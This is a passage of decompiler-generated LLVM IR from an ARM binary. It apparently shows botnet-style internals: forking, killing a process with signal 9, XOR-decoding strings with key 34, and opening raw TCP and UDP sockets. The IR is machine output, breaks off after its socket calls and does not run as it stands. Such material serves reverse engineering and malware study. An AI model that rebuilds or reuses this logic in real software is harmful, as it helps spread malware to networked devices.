  %v2_10f1c = urem i32 %v1_10f1c, 256
  store i32 %v2_10f1c, i32* %lr.global-to-local, align 4
  br label %.thread12

..thread12_crit_edge:                             ; preds = %.thread6
  %v1_10f1c10 = load i32, i32* %ip.global-to-local, align 4
  %v2_10f1c11 = urem i32 %v1_10f1c10, 256
  store i32 %v2_10f1c11, i32* %lr.global-to-local, align 4
  br label %.thread12

bb67:                                             ; preds = %.thread6
  %v1_10f20.pre = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_10f20.pre, i32* %r5.global-to-local, align 4
  store i32 0, i32* %lr.global-to-local, align 4
  br label %.thread12

.thread12:                                        ; preds = %bb66, %..thread12_crit_edge, %bb67
  %v0_10f38.pre = phi i32 [ %v2_10f1c11, %..thread12_crit_edge ], [ %v2_10f1c, %bb66 ], [ 0, %bb67 ]
  %v0_10f28 = load i32, i32* %r4.global-to-local, align 4
  %v1_10f28 = add i32 %v0_10f28, 1
  store i32 %v1_10f28, i32* %r4.global-to-local, align 4
  %v0_10f2c = load i32, i32* %r0.global-to-local, align 4
  %v1_10f2c = add i32 %v0_10f2c, -1
  store i32 %v1_10f2c, i32* %r0.global-to-local, align 4
  %v0_10f30 = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_10f30, i32* %r2.global-to-local, align 4
  %v2_10f34 = icmp eq i32 %v1_10f2c, 0
  store i1 %v2_10f34, i1* %cpsr_z.global-to-local, align 1
  %v1_10f38 = add nuw nsw i32 %v0_10f38.pre, 1
  store i32 %v1_10f38, i32* %ip.global-to-local, align 4
  %v1_10f3c = add i32 %v0_10f30, 1
  store i32 %v1_10f3c, i32* %r1.global-to-local, align 4
  %tmp68 = icmp slt i32 %v1_10f2c, 1
  %extract.t79 = trunc i32 %v0_10f38.pre to i8
  br i1 %tmp68, label %dec_label_pc_10f44, label %dec_label_pc_10f04

dec_label_pc_10f44:                               ; preds = %.thread12, %dec_label_pc_10ebc
  %v2_10f48.lcssa = phi i32 [ %v2_10ef4, %dec_label_pc_10ebc ], [ %v0_10f30, %.thread12 ]
  store i32 0, i32* @r4, align 4
  %v3_10f48 = inttoptr i32 %v2_10f48.lcssa to i8*
  store i8 0, i8* %v3_10f48, align 1
  store i32 %v2_10ee8, i32* %r0.global-to-local, align 4
  %v1_10f50 = bitcast i32* %stack_var_-2228 to i8*
  %v2_10f50 = call i32 @function_13a08(i8* %v1_10f50)
  %v2_10f54 = ptrtoint i32* %stack_var_-216 to i32
  store i32 %v2_10f54, i32* %r1.global-to-local, align 4
  %v0_10f58 = load i32, i32* %fp.global-to-local, align 4
  %v2_10f58 = add i32 %v0_10f58, %v2_10f50
  store i32 %v2_10f58, i32* %r5.global-to-local, align 4
  %v0_10f5c = load i32, i32* @r4, align 4
  store i32 %v0_10f5c, i32* %stack_var_-64, align 4
  store i32 %v2_10ee8, i32* %r0.global-to-local, align 4
  %v2_10f70 = call i32 @function_13a08(i8* %v1_10f50)
  %v1_10f74 = add i32 %v2_10f70, 17
  store i32 %v1_10f74, i32* %r0.global-to-local, align 4
  %v0_10f7c = call i32 @function_10bd8()
  store i32 16, i32* %r1.global-to-local, align 4
  %v2_10f9c = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_10f9c, i32* %r0.global-to-local, align 4
  %v2_10fa4 = call i32 @function_13aa8(i32 %v2_10f9c, i32 16)
  store i32 2, i32* %stack_var_-64, align 4
  store i32 53, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_10ff0 = load i32, i32* %r5.global-to-local, align 4
  %v2_10ff0 = add i32 %v0_10ff0, 1
  store i32 %v2_10ff0, i32* %ip.global-to-local, align 4
  %v2_10ff4 = ptrtoint i8* %stack_var_-4288 to i32
  store i32 %v2_10ff4, i32* %r1.global-to-local, align 4
  %v0_11010 = load i32, i32* @r4, align 4
  %v1_11010 = trunc i32 %v0_11010 to i8
  %v4_11010 = inttoptr i32 %v2_10ff0 to i8*
  store i8 %v1_11010, i8* %v4_11010, align 1
  %v0_11014 = load i32, i32* @r4, align 4
  %v1_11014 = trunc i32 %v0_11014 to i8
  %v2_11014 = load i32, i32* %ip.global-to-local, align 4
  %v3_11014 = add i32 %v2_11014, 2
  %v4_11014 = inttoptr i32 %v3_11014 to i8*
  store i8 %v1_11014, i8* %v4_11014, align 1
  %v0_11018 = load i32, i32* %r0.global-to-local, align 4
  %v1_11018 = trunc i32 %v0_11018 to i8
  %v2_11018 = load i32, i32* %ip.global-to-local, align 4
  %v3_11018 = add i32 %v2_11018, 3
  %v4_11018 = inttoptr i32 %v3_11018 to i8*
  store i8 %v1_11018, i8* %v4_11018, align 1
  %v0_1101c = load i32, i32* %r0.global-to-local, align 4
  %v1_1101c = trunc i32 %v0_1101c to i8
  %v2_1101c = load i32, i32* %ip.global-to-local, align 4
  %v3_1101c = add i32 %v2_1101c, 1
  %v4_1101c = inttoptr i32 %v3_1101c to i8*
  store i8 %v1_1101c, i8* %v4_1101c, align 1
  store i1 true, i1* %cpsr_z.global-to-local, align 1
  store i32 69692, i32* %lr.global-to-local, align 4
  call void @__pseudo_cond_branch(i1 false, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_11048 = call i32 @_socket(i32 2, i32 2, i32 0)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_10f30, { 0, 1, 3, 2 }
  uselistorder i32 %v1_10f2c, { 1, 0, 2 }
  uselistorder i32 %v1_10f28, { 1, 0 }
  uselistorder i32 %v2_10f1c11, { 1, 0 }
  uselistorder i32 %v2_10f1c, { 1, 0 }
  uselistorder i1 %v8_10f0c, { 1, 0 }
  uselistorder i32 %v2_10ef4, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32* %r4.global-to-local, { 0, 2, 1, 3 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32* %r1.global-to-local, { 0, 1, 2, 3, 5, 7, 4, 8, 6 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 0 }
  uselistorder i32* %lr.global-to-local, { 0, 1, 5, 2, 4, 3 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 5, 3, 1, 2, 4, 6 }
  uselistorder i32 53, { 1, 0 }
  uselistorder i32 (i32, i32)* @function_13aa8, { 8, 12, 11, 10, 9, 7, 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 ()* @function_10bd8, { 6, 9, 8, 7, 5, 4, 3, 2, 1, 0 }
  uselistorder label %.thread12, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f04, { 1, 0 }
}

define i32 @function_11408(i32 %arg1) local_unnamed_addr {
dec_label_pc_11408:
  %v2_1140c = load i32, i32* @global_var_1cdcc.238, align 4
  %v2_11414 = call i32 @kill(i32 %v2_1140c, i32 9)
  %v0_11418 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11418, label %bb, label %bb2

bb:                                               ; preds = %dec_label_pc_11408
  %v2_11418 = load i32, i32* @ip, align 4
  %v5_114181 = udiv i32 %v2_11418, 134217728
  %v6_11418 = and i32 %v5_114181, 9
  store i32 %v6_11418, i32* @ip, align 4
  br label %bb2

bb2:                                              ; preds = %dec_label_pc_11408, %bb
  ret i32 %v2_11414

; uselistorder directives
  uselistorder i32 (i32, i32)* @kill, { 3, 1, 6, 2, 12, 11, 0, 5, 4, 8, 7, 10, 9, 13 }
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_1141c() local_unnamed_addr {
dec_label_pc_1141c:
  %v0_11420 = load i32, i32* @r0, align 4
  %v1_11424 = add i32 %v0_11420, 4
  %v2_11424 = inttoptr i32 %v1_11424 to i32*
  %v3_11424 = load i32, i32* %v2_11424, align 4
  %v1_11444 = icmp ne i32 %v3_11424, -1
  call void @__pseudo_cond_branch(i1 %v1_11444, i32 ptrtoint (i32* @global_var_8dcc.81 to i32))
  %v3_11454 = call i32 @_socket(i32 2, i32 1, i32 0)
  unreachable

; uselistorder directives
  uselistorder void (i1, i32)* @__pseudo_cond_branch, { 4, 2, 3, 0, 1, 5, 6, 7, 8, 9 }
}

define i32 @function_114f0(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_114f0:
  %fp.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-44 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_1cd70.242 to i32), i32* %r8.global-to-local, align 4
  %v2_114f8 = load i32, i32* @global_var_1cd70.242, align 4
  store i32 ptrtoint (i32* @global_var_1cd9c.244 to i32), i32* %sb.global-to-local, align 4
  %v3_11504 = mul i32 %v2_114f8, 16
  store i32 %v3_11504, i32* %r3.global-to-local, align 4
  %v3_1150c = urem i32 %arg3, 65536
  store i32 %v3_1150c, i32* %r2.global-to-local, align 4
  store i32 %arg1, i32* %r5.global-to-local, align 4
  %v2_11518 = load i32, i32* @global_var_1cd9c.244, align 4
  %v1_1151c = add i32 %v3_11504, 16
  store i32 %v1_1151c, i32* %r1.global-to-local, align 4
  store i32 %v3_1150c, i32* %stack_var_-44, align 4
  %v8_11524 = inttoptr i32 %v2_11518 to i32*
  %v9_11524 = call i32* @realloc(i32* %v8_11524, i32 %v1_1151c)
  %v11_11524 = ptrtoint i32* %v9_11524 to i32
  store i32 %v11_11524, i32* %sl.global-to-local, align 4
  %v0_1152c = load i32, i32* %r5.global-to-local, align 4
  %v1_11530 = load i32, i32* %sb.global-to-local, align 4
  %v2_11530 = inttoptr i32 %v1_11530 to i32*
  store i32 %v11_11524, i32* %v2_11530, align 4
  %v2_11534 = load i32, i32* @global_var_1cd70.242, align 4
  store i32 %v2_11534, i32* %fp.global-to-local, align 4
  %v1_11538 = inttoptr i32 %v0_1152c to i8*
  %v2_11538 = call i32 @function_13a08(i8* %v1_11538)
  %sext = mul i32 %v2_11538, 16777216
  %v1_1153c = sdiv i32 %sext, 16777216
  %v2_1153c = add nsw i32 %v1_1153c, 1
  store i32 %v1_1153c, i32* %r7.global-to-local, align 4
  %v1_11548 = call i32 @_malloc(i32 %v2_1153c)
  %v0_1154c = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_1154c, i32* %r1.global-to-local, align 4
  store i32 %v2_1153c, i32* %r2.global-to-local, align 4
  store i32 %v1_11548, i32* %r6.global-to-local, align 4
  %v3_11558 = call i32 @function_13a84(i32 %v1_11548, i32 %v0_1154c, i32 %v2_1153c)
  %v0_1155c = load i32, i32* %r7.global-to-local, align 4
  %tmp21 = icmp slt i32 %v0_1155c, 1
  %extract.t6 = trunc i32 %v0_1155c to i8
  br i1 %tmp21, label %dec_label_pc_11580, label %dec_label_pc_11564

dec_label_pc_11564:                               ; preds = %dec_label_pc_114f0
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11568

dec_label_pc_11568:                               ; preds = %dec_label_pc_11568, %dec_label_pc_11564
  %v2_11570 = phi i32 [ %v1_11574, %dec_label_pc_11568 ], [ 0, %dec_label_pc_11564 ]
  %v1_11568 = load i32, i32* %r6.global-to-local, align 4
  %v2_11568 = add i32 %v1_11568, %v2_11570
  %v3_11568 = inttoptr i32 %v2_11568 to i8*
  %v4_11568 = load i8, i8* %v3_11568, align 1
  %v6_11568 = zext i8 %v4_11568 to i32
  %v1_1156c = xor i32 %v6_11568, 34
  store i32 %v1_1156c, i32* %r3.global-to-local, align 4
  %v1_11570 = trunc i32 %v1_1156c to i8
  store i8 %v1_11570, i8* %v3_11568, align 1
  %v0_11574 = load i32, i32* %r2.global-to-local, align 4
  %v1_11574 = add i32 %v0_11574, 1
  store i32 %v1_11574, i32* %r2.global-to-local, align 4
  %v0_11578 = load i32, i32* %r7.global-to-local, align 4
  %v9_11578 = icmp eq i32 %v0_11578, %v1_11574
  br i1 %v9_11578, label %dec_label_pc_11580.loopexit, label %dec_label_pc_11568

dec_label_pc_11580.loopexit:                      ; preds = %dec_label_pc_11568
  %extract.t = trunc i32 %v1_11574 to i8
  br label %dec_label_pc_11580

dec_label_pc_11580:                               ; preds = %dec_label_pc_11580.loopexit, %dec_label_pc_114f0
  %v0_11590.off0 = phi i8 [ %extract.t, %dec_label_pc_11580.loopexit ], [ %extract.t6, %dec_label_pc_114f0 ]
  %v2_11580 = load i32, i32* @global_var_1cd70.242, align 4
  %v2_11584 = load i32, i32* @global_var_1cd9c.244, align 4
  store i32 %v2_11584, i32* %r2.global-to-local, align 4
  %v3_11588 = mul i32 %v2_11580, 16
  %v2_1158c = add i32 %v2_11584, %v3_11588
  store i32 %v2_1158c, i32* %r3.global-to-local, align 4
  %v3_11590 = add i32 %v2_1158c, 12
  %v4_11590 = inttoptr i32 %v3_11590 to i8*
  store i8 %v0_11590.off0, i8* %v4_11590, align 1
  %v0_11594 = load i32, i32* %r6.global-to-local, align 4
  %v1_11594 = load i32, i32* %sl.global-to-local, align 4
  %v2_11594 = load i32, i32* %fp.global-to-local, align 4
  %v5_11594 = mul i32 %v2_11594, 16
  %v6_11594 = add i32 %v5_11594, %v1_11594
  %v7_11594 = inttoptr i32 %v6_11594 to i32*
  store i32 %v0_11594, i32* %v7_11594, align 4
  %v2_1159c = load i32, i32* @global_var_1cd70.242, align 4
  store i32 %v2_1159c, i32* %r7.global-to-local, align 4
  %v2_115a0 = load i32, i32* @global_var_1cd9c.244, align 4
  store i32 %v2_115a0, i32* %sl.global-to-local, align 4
  %v1_115a4 = inttoptr i32 %arg2 to i8*
  %v2_115a4 = call i32 @function_13a08(i8* %v1_115a4)
  %sext1 = mul i32 %v2_115a4, 16777216
  %v1_115a8 = sdiv i32 %sext1, 16777216
  %v2_115a8 = add nsw i32 %v1_115a8, 1
  store i32 %v1_115a8, i32* %r5.global-to-local, align 4
  %v1_115b4 = call i32 @_malloc(i32 %v2_115a8)
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %v2_115a8, i32* %r2.global-to-local, align 4
  store i32 %v1_115b4, i32* %r6.global-to-local, align 4
  %v3_115c4 = call i32 @function_13a84(i32 %v1_115b4, i32 %arg2, i32 %v2_115a8)
  %tmp22 = icmp slt i32 %sext1, 16777216
  %extract.t8 = trunc i32 %v1_115a8 to i8
  br i1 %tmp22, label %dec_label_pc_115ec, label %dec_label_pc_115d0

dec_label_pc_115d0:                               ; preds = %dec_label_pc_11580
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_115d4

dec_label_pc_115d4:                               ; preds = %dec_label_pc_115d4, %dec_label_pc_115d0
  %v2_115dc = phi i32 [ %v1_115e0, %dec_label_pc_115d4 ], [ 0, %dec_label_pc_115d0 ]
  %v1_115d4 = load i32, i32* %r6.global-to-local, align 4
  %v2_115d4 = add i32 %v1_115d4, %v2_115dc
  %v3_115d4 = inttoptr i32 %v2_115d4 to i8*
  %v4_115d4 = load i8, i8* %v3_115d4, align 1
  %v6_115d4 = zext i8 %v4_115d4 to i32
  %v1_115d8 = xor i32 %v6_115d4, 34
  store i32 %v1_115d8, i32* %r3.global-to-local, align 4
  %v1_115dc = trunc i32 %v1_115d8 to i8
  store i8 %v1_115dc, i8* %v3_115d4, align 1
  %v0_115e0 = load i32, i32* %r2.global-to-local, align 4
  %v1_115e0 = add i32 %v0_115e0, 1
  store i32 %v1_115e0, i32* %r2.global-to-local, align 4
  %v0_115e4 = load i32, i32* %r5.global-to-local, align 4
  %v9_115e4 = icmp eq i32 %v0_115e4, %v1_115e0
  br i1 %v9_115e4, label %dec_label_pc_115ec.loopexit, label %dec_label_pc_115d4

dec_label_pc_115ec.loopexit:                      ; preds = %dec_label_pc_115d4
  %extract.t7 = trunc i32 %v1_115e0 to i8
  br label %dec_label_pc_115ec

dec_label_pc_115ec:                               ; preds = %dec_label_pc_115ec.loopexit, %dec_label_pc_11580
  %v0_115fc.off0 = phi i8 [ %extract.t7, %dec_label_pc_115ec.loopexit ], [ %extract.t8, %dec_label_pc_11580 ]
  %v2_115ec = load i32, i32* @global_var_1cd70.242, align 4
  %v2_115f0 = load i32, i32* @global_var_1cd9c.244, align 4
  %v3_115f4 = mul i32 %v2_115ec, 16
  %v2_115f8 = or i32 %v3_115f4, 13
  %v3_115fc = add i32 %v2_115f8, %v2_115f0
  %v4_115fc = inttoptr i32 %v3_115fc to i8*
  store i8 %v0_115fc.off0, i8* %v4_115fc, align 1
  %v2_11604 = load i32, i32* @global_var_1cd70.242, align 4
  store i32 %v2_11604, i32* %lr.global-to-local, align 4
  %v4_11608 = load i8, i8* @global_var_1cda1.247, align 1
  %v5_11608 = zext i8 %v4_11608 to i32
  %v3_1160c = load i8, i8* bitcast (i8** @global_var_1cda0.246 to i8*), align 4
  %v4_1160c = zext i8 %v3_1160c to i32
  %v2_11610 = load i32, i32* @global_var_1cd9c.244, align 4
  %v4_11614 = mul nuw nsw i32 %v5_11608, 256
  %v5_11614 = or i32 %v4_1160c, %v4_11614
  store i32 %v5_11614, i32* %r2.global-to-local, align 4
  %v3_11618 = mul i32 %v2_11604, 16
  %v2_1161c = add i32 %v2_11610, %v3_11618
  store i32 %v2_1161c, i32* %r1.global-to-local, align 4
  %v3_11624 = add i32 %v2_1161c, 9
  %v4_11624 = inttoptr i32 %v3_11624 to i8*
  store i8 %v4_11608, i8* %v4_11624, align 1
  %v0_11628 = load i32, i32* %r2.global-to-local, align 4
  %v1_11628 = trunc i32 %v0_11628 to i8
  %v2_11628 = load i32, i32* %r1.global-to-local, align 4
  %v3_11628 = add i32 %v2_11628, 8
  %v4_11628 = inttoptr i32 %v3_11628 to i8*
  store i8 %v1_11628, i8* %v4_11628, align 1
  %v4_1162c = load i8, i8* @global_var_1cda1.247, align 1
  %v5_1162c = zext i8 %v4_1162c to i32
  %v3_11630 = load i8, i8* bitcast (i8** @global_var_1cda0.246 to i8*), align 4
  %v4_11630 = zext i8 %v3_11630 to i32
  %v4_11634 = mul nuw nsw i32 %v5_1162c, 256
  %v5_11634 = or i32 %v4_11630, %v4_11634
  %v2_11638 = load i32, i32* %stack_var_-44, align 4
  %v2_1163c = add i32 %v5_11634, %v2_11638
  store i32 %v2_1163c, i32* %r3.global-to-local, align 4
  %v3_116409 = udiv i32 %v2_1163c, 256
  %v1_11644 = trunc i32 %v3_116409 to i8
  %v2_11644 = load i32, i32* %r1.global-to-local, align 4
  %v3_11644 = add i32 %v2_11644, 11
  %v4_11644 = inttoptr i32 %v3_11644 to i8*
  store i8 %v1_11644, i8* %v4_11644, align 1
  %v0_11648 = load i32, i32* %r3.global-to-local, align 4
  %v1_11648 = trunc i32 %v0_11648 to i8
  %v2_11648 = load i32, i32* %r1.global-to-local, align 4
  %v3_11648 = add i32 %v2_11648, 10
  %v4_11648 = inttoptr i32 %v3_11648 to i8*
  store i8 %v1_11648, i8* %v4_11648, align 1
  %v4_1164c = load i8, i8* @global_var_1cda1.247, align 1
  %v5_1164c = zext i8 %v4_1164c to i32
  %v3_11650 = load i8, i8* bitcast (i8** @global_var_1cda0.246 to i8*), align 4
  %v4_11650 = zext i8 %v3_11650 to i32
  %v4_11654 = mul nuw nsw i32 %v5_1164c, 256
  %v5_11654 = or i32 %v4_11650, %v4_11654
  %v2_11658 = load i32, i32* %stack_var_-44, align 4
  %v2_1165c = add i32 %v5_11654, %v2_11658
  store i32 %v2_1165c, i32* %r2.global-to-local, align 4
  %v0_11660 = load i32, i32* %r7.global-to-local, align 4
  %v3_11660 = mul i32 %v0_11660, 16
  %v1_11664 = load i32, i32* %sl.global-to-local, align 4
  %v2_11664 = add i32 %v1_11664, %v3_11660
  store i32 %v2_11664, i32* %r3.global-to-local, align 4
  %v0_11668 = load i32, i32* %lr.global-to-local, align 4
  %v1_11668 = add i32 %v0_11668, 1
  store i32 %v1_11668, i32* %lr.global-to-local, align 4
  %v3_1166c = sdiv i32 %v2_1165c, 256
  store i32 %v3_1166c, i32* %r1.global-to-local, align 4
  %v0_11670 = load i32, i32* %r6.global-to-local, align 4
  %v2_11670 = add i32 %v2_11664, 4
  %v3_11670 = inttoptr i32 %v2_11670 to i32*
  store i32 %v0_11670, i32* %v3_11670, align 4
  %v0_11674 = load i32, i32* %lr.global-to-local, align 4
  %v1_11674 = load i32, i32* %r8.global-to-local, align 4
  %v2_11674 = inttoptr i32 %v1_11674 to i32*
  store i32 %v0_11674, i32* %v2_11674, align 4
  %v0_11678 = load i32, i32* %r1.global-to-local, align 4
  %v1_11678 = trunc i32 %v0_11678 to i8
  store i8 %v1_11678, i8* @global_var_1cda1.247, align 1
  %v0_1167c = load i32, i32* %r2.global-to-local, align 4
  %v1_1167c = trunc i32 %v0_1167c to i8
  store i8 %v1_1167c, i8* bitcast (i8** @global_var_1cda0.246 to i8*), align 4
  ret i32 ptrtoint (i8** @global_var_1cda0.246 to i32)

; uselistorder directives
  uselistorder i32 %v1_115e0, { 0, 2, 3, 1 }
  uselistorder i32 %v1_115b4, { 1, 0 }
  uselistorder i32 %v2_115a8, { 1, 0, 2 }
  uselistorder i32 %v1_11574, { 0, 2, 3, 1 }
  uselistorder i32 %v1_11548, { 1, 0 }
  uselistorder i32 %v2_1153c, { 1, 0, 2 }
  uselistorder i32 %v3_1150c, { 1, 0 }
  uselistorder i32 %v3_11504, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 0 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 0 }
  uselistorder i8* bitcast (i8** @global_var_1cda0.246 to i8*), { 0, 3, 2, 1 }
  uselistorder i8* @global_var_1cda1.247, { 3, 2, 1, 0 }
  uselistorder i32 34, { 3, 4, 0, 5, 1, 6, 2, 7 }
  uselistorder i32 (i8*)* @function_13a08, { 25, 26, 9, 10, 11, 0, 1, 2, 3, 4, 5, 6, 7, 8, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 80, 81, 82, 83, 84 }
  uselistorder i32* (i32*, i32)* @realloc, { 0, 4, 9, 3, 10, 1, 5, 7, 8, 2, 6, 11 }
  uselistorder i32 %arg2, { 1, 0, 2, 3 }
}

define i32 @function_11694() local_unnamed_addr {
dec_label_pc_11694:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %v3_11694 = load i32, i32* @r4, align 4
  %v6_11694 = load i32, i32* @r5, align 4
  %v9_11694 = load i32, i32* @r6, align 4
  %v12_11694 = load i32, i32* @r7, align 4
  %v15_11694 = load i32, i32* @r8, align 4
  %v18_11694 = load i32, i32* @sb, align 4
  %v21_11694 = load i32, i32* @sl, align 4
  %v24_11694 = load i32, i32* @fp, align 4
  %v0_1169c = call i32 @fork()
  store i32 %v0_1169c, i32* %r0.global-to-local, align 4
  %v7_116a0 = icmp eq i32 %v0_1169c, -1
  %tmp55 = icmp slt i32 %v0_1169c, 1
  %v2_116bc58 = icmp eq i1 %v7_116a0, false
  %v2_116bc = and i1 %tmp55, %v2_116bc58
  store i32 %v0_1169c, i32* @global_var_1cdcc.238, align 4
  br i1 %v2_116bc, label %dec_label_pc_116d0, label %dec_label_pc_116c8

dec_label_pc_116c8:                               ; preds = %dec_label_pc_11694
  store i32 %v3_11694, i32* @r4, align 4
  store i32 %v6_11694, i32* %r5.global-to-local, align 4
  store i32 %v9_11694, i32* @r6, align 4
  store i32 %v12_11694, i32* @r7, align 4
  store i32 %v15_11694, i32* @r8, align 4
  store i32 %v18_11694, i32* @sb, align 4
  store i32 %v21_11694, i32* @sl, align 4
  store i32 %v24_11694, i32* @fp, align 4
  ret i32 %v0_1169c

dec_label_pc_116d0:                               ; preds = %dec_label_pc_11694
  %v0_116d0 = call i32 @function_13cc0()
  store i32 %v0_116d0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1cda8.141 to i32), i32* %r1.global-to-local, align 4
  store i32 %v0_116d0, i32* @global_var_1cda8.141, align 4
  %v1_116dc = call i32 @function_10c30(i32 %v0_116d0)
  %v0_116e0 = load i32, i32* @r4, align 4
  store i32 %v0_116e0, i32* %r0.global-to-local, align 4
  %v1_116e4 = inttoptr i32 %v0_116e0 to i32*
  %v2_116e4 = call i32 @time(i32* %v1_116e4)
  store i32 288, i32* %r1.global-to-local, align 4
  store i32 %v2_116e4, i32* @global_var_1cda4.240, align 4
  store i32 256, i32* %r0.global-to-local, align 4
  %v2_116f8 = call i32* @calloc(i32 256, i32 288)
  %v4_116f8 = ptrtoint i32* %v2_116f8 to i32
  store i32 %v4_116f8, i32* %lr.global-to-local, align 4
  %v0_11704 = load i32, i32* @r4, align 4
  store i32 %v4_116f8, i32* @global_var_1cdc4.252, align 4
  store i32 %v0_11704, i32* %r5.global-to-local, align 4
  store i32 -1, i32* %r0.global-to-local, align 4
  store i32 %v0_11704, i32* %ip.global-to-local, align 4
  %v1_1171c = add i32 %v4_116f8, 4
  store i32 %v1_1171c, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_11720

dec_label_pc_11720:                               ; preds = %dec_label_pc_11720.dec_label_pc_11720_crit_edge, %dec_label_pc_116d0
  %v0_11738 = phi i32 [ %v0_11738.pre, %dec_label_pc_11720.dec_label_pc_11720_crit_edge ], [ %v0_11704, %dec_label_pc_116d0 ]
  %v0_11728 = phi i32 [ %v0_11740, %dec_label_pc_11720.dec_label_pc_11720_crit_edge ], [ %v0_11704, %dec_label_pc_116d0 ]
  %v1_11730 = phi i32 [ %v1_11730.pre, %dec_label_pc_11720.dec_label_pc_11720_crit_edge ], [ %v4_116f8, %dec_label_pc_116d0 ]
  %v1_11728 = add i32 %v0_11728, 1
  store i32 %v1_11728, i32* %ip.global-to-local, align 4
  %v2_1172c = mul i32 %v0_11728, 288
  %v2_11730 = add i32 %v1_11730, 12
  %v2_11738 = add i32 %v2_11730, %v2_1172c
  %v3_11738 = inttoptr i32 %v2_11738 to i32*
  store i32 %v0_11738, i32* %v3_11738, align 4
  %v0_1173c = load i32, i32* %r0.global-to-local, align 4
  %v1_1173c = load i32, i32* %r1.global-to-local, align 4
  %v2_1173c = inttoptr i32 %v1_1173c to i32*
  store i32 %v0_1173c, i32* %v2_1173c, align 4
  %v3_1173c = load i32, i32* %r1.global-to-local, align 4
  %v4_1173c = add i32 %v3_1173c, 288
  store i32 %v4_1173c, i32* %r1.global-to-local, align 4
  %v7_11744 = icmp sgt i32 %v1_11728, 255
  br i1 %v7_11744, label %dec_label_pc_11748, label %dec_label_pc_11720.dec_label_pc_11720_crit_edge

dec_label_pc_11720.dec_label_pc_11720_crit_edge:  ; preds = %dec_label_pc_11720
  %v0_11740 = load i32, i32* %ip.global-to-local, align 4
  %v1_11730.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_11738.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_11720

dec_label_pc_11748:                               ; preds = %dec_label_pc_11720
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 3, i32* %r1.global-to-local, align 4
  %v3_11758 = call i32 @_socket(i32 2, i32 3, i32 6)
  unreachable

; uselistorder directives
  uselistorder i32 %v0_11728, { 1, 0 }
  uselistorder i32 %v0_11704, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1169c, { 1, 2, 3, 0, 4 }
  uselistorder i32* %r0.global-to-local, { 3, 1, 2, 4, 5, 0, 6 }
  uselistorder i32* (i32, i32)* @calloc, { 12, 13, 3, 1, 21, 6, 18, 2, 23, 10, 0, 19, 16, 26, 15, 9, 17, 24, 22, 5, 4, 8, 14, 20, 11, 27, 25, 7, 28 }
  uselistorder i32 288, { 2, 0, 1, 3 }
  uselistorder i32 (i32*)* @time, { 3, 2, 1, 0, 5, 4, 6 }
  uselistorder i32* @global_var_1cda8.141, { 1, 0, 7, 2, 3, 4, 5, 6 }
  uselistorder i32 ()* @function_13cc0, { 0, 2, 1 }
  uselistorder i32 ()* @fork, { 4, 2, 3, 1, 0, 5 }
  uselistorder i32* @fp, { 5, 6, 4, 0, 1, 2, 3, 7 }
  uselistorder i32* @sl, { 18, 19, 17, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 41, 36, 37, 38, 39, 40, 0, 42, 43, 44, 45 }
  uselistorder i32* @sb, { 4, 5, 3, 0, 1, 2, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19 }
